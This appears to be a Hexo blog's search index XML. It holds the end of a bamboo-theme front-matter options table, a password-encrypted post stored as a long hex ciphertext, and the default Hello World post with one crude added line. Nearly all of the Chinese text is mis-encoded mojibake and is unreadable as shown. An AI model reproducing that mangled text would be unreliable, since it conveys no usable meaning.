æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œæ²¡æœ‰åˆ™é»˜è®¤ä½¿ç”¨æ–‡ç« çš„ç‰¹è‰²å›¾ç‰‡</td></tr><tr><td align="left">excerpt</td><td align="left">æ— </td><td align="left">æ–‡ç« æè¿°ï¼ˆæ‘˜è¦ï¼‰ï¼Œè¯¥æ–‡ç« åœ¨é¦–é¡µçš„æè¿°æ–‡å­—ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™å–<code>swiperDesc</code>,å¦‚æœ<code>swiperDesc</code>ä¹Ÿæ²¡æœ‰ï¼Œåˆ™å–æ–‡ç« å†…å®¹ï¼ˆä¼˜å…ˆå–<code>&lt;!-- more --&gt;</code>ä¸Šé¢çš„å†…å®¹ï¼‰</td></tr><tr><td align="left">top</td><td align="left">false</td><td align="left">å°†è¯¥å€¼è®¾ä¸ºtrueï¼Œåˆ™å°†è¯¥ç¯‡æ–‡ç« æ˜¾ç¤ºåœ¨é¦–é¡µçš„ç½®é¡¶æ ç›®ä¸­</td></tr><tr><td align="left">toc</td><td align="left">true</td><td align="left">å°†è¯¥å€¼è®¾ä¸ºfalseï¼Œåˆ™è¯¥ç¯‡æ–‡ç« ä¸æ˜¾ç¤ºå³ä¾§ç›®å½•</td></tr><tr><td align="left">tocOpen</td><td align="left">true</td><td align="left">å°†è¯¥å€¼è®¾ä¸ºfalseï¼Œåˆ™è¯¥ç¯‡æ–‡ç« å³ä¾§ç›®å½•é»˜è®¤æ”¶ç¼©</td></tr><tr><td align="left">onlyTitle</td><td align="left">false</td><td align="left">æ–‡ç« è¯¦æƒ…é¡µå¤´éƒ¨æ˜¯å¦åªæ˜¾ç¤ºæ ‡é¢˜ï¼Œä¸æ˜¾ç¤ºæ—¥æœŸç­‰ä¿¡æ¯</td></tr><tr><td align="left">comments</td><td align="left">true</td><td align="left">å°†è¯¥å€¼è®¾ä¸ºfalseï¼Œåˆ™è¯¥ç¯‡æ–‡ç« ä¸æ˜¾ç¤ºè¯„è®º</td></tr><tr><td align="left">share</td><td align="left">true</td><td align="left">å°†è¯¥å€¼è®¾ä¸ºfalseï¼Œåˆ™è¯¥ç¯‡æ–‡ç« ä¸æ˜¾ç¤ºåˆ†äº«æŒ‰é’®</td></tr><tr><td align="left">copyright</td><td align="left">true</td><td align="left">å°†è¯¥å€¼è®¾ä¸ºfalseï¼Œåˆ™è¯¥ç¯‡æ–‡ç« ä¸æ˜¾ç¤ºç‰ˆæƒå£°æ˜</td></tr><tr><td align="left">donate</td><td align="left">true</td><td align="left">å°†è¯¥å€¼è®¾ä¸ºfalseï¼Œåˆ™è¯¥ç¯‡æ–‡ç« ä¸æ˜¾ç¤ºæ‰“èµæŒ‰é’®</td></tr><tr><td align="left">bgImg</td><td align="left">-</td><td align="left">å•ç‹¬ä¸ºè¿™ç¯‡æ–‡ç« è®¾ç½®èƒŒæ™¯å›¾ç‰‡æˆ–è€…èƒŒæ™¯é¢œè‰²ï¼Œå¯ä»¥æ˜¯æ•°ç»„ï¼Œæ•°ç»„é‡Œé¢æ”¾å›¾ç‰‡é“¾æ¥ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²é‡Œé¢æ˜¯é¢œè‰²å€¼ï¼Œç©ºå€¼åˆ™èƒŒæ™¯é¢œè‰²é€æ˜</td></tr><tr><td align="left">bgImgTransition</td><td align="left">fade</td><td align="left">è¯¥ç¯‡æ–‡ç« çš„bgImgè®¾ç½®ä¸ºæ•°ç»„,è¯¥å€¼è¡¨ç¤ºèƒŒæ™¯å›¾ç‰‡åˆ‡æ¢çš„åŠ¨ç”», æœ‰ä¸‰ç§å€¼ï¼ˆfade, scale, translate-fadeï¼‰</td></tr><tr><td align="left">bgImgDelay</td><td align="left">180000(ä¸‰åˆ†é’Ÿ)</td><td align="left">è¯¥ç¯‡æ–‡ç« çš„bgImgè®¾ç½®ä¸ºæ•°ç»„,è¯¥å€¼è¡¨ç¤ºèƒŒæ™¯å›¾ç‰‡åˆ‡æ¢çš„å»¶è¿Ÿæ—¶é—´,</td></tr><tr><td align="left">categories</td><td align="left">æ— </td><td align="left">æ–‡ç« åˆ†ç±»ï¼Œæœ¬ä¸»é¢˜çš„åˆ†ç±»è¡¨ç¤ºå®è§‚ä¸Šå¤§çš„åˆ†ç±»ï¼Œåªå»ºè®®ä¸€ç¯‡æ–‡ç« ä¸€ä¸ªåˆ†ç±»</td></tr><tr><td align="left">prismjs</td><td align="left">æ— </td><td align="left">å¦‚æœä½¿ç”¨çš„æ˜¯hexoè‡ªå¸¦çš„prismjsä»£ç é«˜äº®ï¼Œé€šè¿‡è®¾ç½®è¯¥å€¼ä¸ºè¯¥ç¯‡æ–‡ç« è®¾ç½®ä¸åŒçš„ä»£ç é«˜äº®ä¸»é¢˜ï¼ˆdefault, coy, dark, funky, okaidia, solarizedlight, tomorrow, twilightï¼‰</td></tr><tr><td align="left">tags</td><td align="left">æ— </td><td align="left">æ–‡ç« æ ‡ç­¾ï¼Œä¸€ç¯‡æ–‡ç« å¯ä»¥å¤šä¸ªæ ‡ç­¾</td></tr><tr><td align="left">mathjax</td><td align="left">false</td><td align="left">mathjaxå…¬å¼</td></tr><tr><td align="left">imgTop</td><td align="left">true</td><td align="left">è®¾ç½®ä¸º<code>false</code>åˆ™æ–‡ç« å’Œè‡ªå®šä¹‰é¡µé¢é¡¶éƒ¨ä¸è¦å›¾ç‰‡</td></tr></tbody></table><p>æœç„¶åš<code>æ¬è¿å·¥</code>éå¸¸èˆ’é€‚ï¼Œç›´æ¥æ¬äº†<code>yuangå¤§ä½¬</code>çš„ï¼Œæ–¹ä¾¿è‡ªå·±ä»¥åæŸ¥çœ‹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> bamboo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> bamboo </tag>
            
            <tag> front-matter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å»ºç«™å†ç¨‹</title>
      <link href="/2022/03/20/jian-zhan-li-cheng/"/>
      <url>/2022/03/20/jian-zhan-li-cheng/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰ï¼Œè¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹ï¼Œè¯·å†è¯•è¯•ã€‚" data-whm="æŠ±æ­‰ï¼Œè¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«çº æ­£ï¼Œä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹ã€‚">  <script id="hbeData" type="hbeData" data-hmacdigest="331f81d64f89df91591dddd5ae48048c8fce24146384d8c027a5a36613b7ffc4">2cf9f0e39f26ddd937cd5eb31197d2f709799e0107d13d77fa0dec990dba703a79dc0b71d5dde29261641f59dd5bf3608b85183b214a2229e5c7f5638ca89cfb1a7cab5d399463afa27229db8ef5671da3e8d5ac3b4971669d10acb62b011b2d55c5e6a5b42867ccf67394ccdaba4a8cd3215d7358ede93e33185b7dab5aa24c450736dbbc5b8be01fcb13262096d0a120c3b784559e76c7b005ba4d699ae714c456d8300bae9036d1629efa536c364f7d1fa9a409ab70056dc7bb9b437156e9fb5fe11c5bda4c5dda81c14fd94f5b17f6601278d4db85c4e31b8be10c42eb050670caec7ca7a249819d031e5adbacca8e7bfcad743b0f9e1791e851359bc7a3adcf1481677a2bea8064f629ee110c4e4fa2da66e8647e5e7579ce5afe4a566d7986fb3d10a84b449b01c0397c3ce90e9a1cb6d215b60bccf9ce34b690a7b9cefb179ffd47feae8bed6f9c98dc44a79e7a95a1533ed776207f53a4bbcaf1af8d815fbef3f026e3a763b6b857214501f99f82909ef9404246e6e7a078cfa5463fcee73183e5e980ccc26a28104837664ed9a60ff2616c7e0dc77e036069948bd923496bdaa7262e8b3670440ff0e3bb6c7d16843bd3e15a7a87aba0be8c09f591a4695a07ad80b5d8fc5746763d16206a1155ba5628501d158fc03da5f8a53009a3579111a2a9fde8854c7d4f8cbe49275113aeece381a774d60fc852c16aaa9152a50a57372d2b1c3290bc10f36211a8cbe593120c35fee21ef0fe216ee08f6fe91015b60486ffa16813e0125a173cc50a92275840acf4507791bbd48726be7d18ac20afdfc529574c888e87bb959fb2dbd5d0eff53a610f95bc3c16d52d24bdd7c6f1607e7a64fc492bc07fedeeb98ab9c9d4f4cf8eac078753f5d6fc1a13ec93497392f8be05c547560821265825682804996ac104a5a9b6eac427b02c18e7bfc5050d60b080540b3607294dad6c4342fe602fd113c194b54f440b2d84e710fbb6ad290d219b53a2f4e6ec63ebdb39d6f87c79816760cc1ba78ff5f3af9a484f270d2969184e75150a141dcfe977feb8246d227b42b60ebbc4562dcec59cb97652d22823bef2d55da100762dc25b1d21c5a406353d893a3096460bffc33f0450288d1dbbfb8d30fda579f116fed536ae86292acdc31323d63b7f68edccccd1d12fe852e8e969e71553b2b57703bb94f0f4b4f35d948fecbabdf6f542e874daf11772ee54b20c77fdfc4fbe135c86d2f0669376a655d25c842b9d8b64f95538cd058e2668522d181f7a5a0741d3f2160c90a80132498eac5633c7697cc2b85f3b83bdc8403ca2d7dc9262e7377cb15cfb75ac7a9f10a0a8bbb6807c611eeee51713e0e92a401cbf651dea314cc90ea77806acf12a3b220f838b69d8be49a9836d2856484d62dff5623d0011da685835032f6b46a90fba47c46da7f5b3f90bc35a970d8703a604123255f07ccd959f87e3884f73d99ab0916b28f226806bcbd25b2f94d622c9472e8eff42450f8d25190c232fcddef5aa81b30ff15b03ad492109edf1dc0885faed78e610c3c8f1ae5e724d925c77ab243b45b629bc69bd39632508513ad4c4fc135488dcb59fc014223b73ff110d17535443c593641776a7cc087912cca13733879f88c5beb4ab8fbb1a84408205d5b942d884e4ddc9d573eabbbc50fd1e39cb83cbae7141935d7b33c56026113ee77d2304b776a2d2d939e3952dfd704b737f8d0e8dc62f6c2a8e1d6d7e547b26f3a6642fbc424cb5d2e2da8c1bf6de73291753edeec3a771f95fea04a224851b4f2bdc86cee44c358b50cc4640d2fbe551d0bc523beca9c5e7a7d08a3c84079708b4b2f6b7be1d35fd392ab22492ccc5a90548035f087beaa3c2bd71354d5228dfec8bb165a39904e6440f7d13d3b2172d1b9ccc7216d997dda491420691bae9e139b5e49b71b910b1195b125809291013cbc2aa42f70ba7a7dbd750c04d0a39a0b7e94814263e903fae30e3cf18c2545bfdfe8042a3f9607e4ec954b80363cb503f772fc5c32d6cf7a2a9a8b198ef838dec6796a29782ee024991d85a7ea07c46b88eca2c24a9d37beedd815b6e1cc1e2d69b7e52ec729d5d8e25da9aa13bbc5dd78746e334fd62bd9227501b503d517177d9009b330fde1264705e0533d9e2f9c45e06f497b5238745712d200cf5469619a14806f57adf3e68633bac9ca0653ab508c0c47a9610976d85c14012c1cca5c47de5dd0b5fab4be1bf9565bf3a834cfad6d196f325e00734e24556079647b854cab766fc5a08a4a1972e2920613e942070ef9114abcbf1c7be9b67abbcde5a2687e13008367b599bb29b5f2eb38961078670ce0bf067dc9ab3f215858b43367ad7696b5e751697bf3d510d4143c31cea4c5284d65a63ef05394b9a2e5475763a4d423f832f59b42667d6f8acad283d6dae118b2926bfd3a5a4b8011363078ac9b5e66a2df9b11f43f63abcd622f42ad1c8bf5e0054a5c81c53dd5774d238860280d20b27214ec9caa903c23b23f5514655d3de792adfb2fa234ffff88e4463d8146cb64d11c429682f7ec877c4da92a402458761017e9987b366a9e23a1585759f6e42072d81d4a3ceba4c05646f8a8c4e81d55eda2bf7bfc992498e08a7f890975ae57a7963963a3c0d75ee1ac04c3d393ade77198d27fb6e766ee61fc13bffc607356683a9282159fe234e096545b5db86957c577c096a0de224f71045f70433293a376a2a0764ee997d24a8da47a346abfa7ed8a2d990ff55922017fc204ae46cd1f818354700403faca166aae85532778e7d5ea2150a75933f835748a724695deeefd77fb0408d73f1d72dd3be838839e96fc313e8ff41960e6ca1d77d59d09726f1bae84c3707c6b4db9ff735a4d4f5db16c5b29106a3c7d450f9f0881bf0eaffc10e84da5ad342ca7761fdf3c5ed95161dd2c0ed81c61d36c9be221f3047b6860ad62eadd23bd5ec96fc228f6d27bbfb29a4105b15775704755ad5107030277fc7437fe3df2274de49267f92386197aa3ceb0d23442a317e32da2c1a360c55162a1dde6fbd76ed8aef8cbf2ad07a8a1432643d6cfd28f4c29e7d85bf98ee383364b229008311690852ee743b980dd03f77acd14076b57c2690a1c27e634e82b6e55afb04e9992d7a2ccfb68955517d295bb0373a3597634b833eff8205381cf3fd00d4e344f35a56b7901d86cb3dac6a5a3c9972607088aebc9dda27aa7216fad2e4cc8e7feed2a9118284aa4f8215701e40f447f2bb31860435819f23ef941d1d081a7901e8cd438d2cb0fc4927985bab25f403ed5f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ‚¨å¥½ï¼Œè¿™é‡Œéœ€è¦å¯†ç ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> é—²è¨€ç¢è¯­ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å»ºç«™ </tag>
            
            <tag> é—²è¨€ç¢è¯­ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/03/18/hello-world/"/>
      <url>/2022/03/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p>so fuck????</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> helloworld </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hello </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
